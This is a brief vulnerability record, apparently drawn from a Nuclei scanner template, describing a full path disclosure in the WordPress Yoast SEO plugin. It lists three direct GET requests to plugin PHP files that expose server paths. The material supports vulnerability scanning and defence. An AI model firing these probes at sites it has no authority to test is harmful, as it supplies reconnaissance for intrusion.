# Vulnerability: WordPress Yoast SEO - Full Path Disclosure
**Classification:** WP
**Source:** Nuclei Template (`wp-yoast-seo-fpd.yaml`)

## Description
WordPress Yoast SEO plugin is vulnerable to full path disclosure via direct access to plugin files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wordpress-seo/src/main.php
GET {{BaseURL}}/wp-content/plugins/wordpress-seo/admin/class-admin.php
GET {{BaseURL}}/wp-content/plugins/wordpress-seo/inc/class-wpseo-utils.php
```

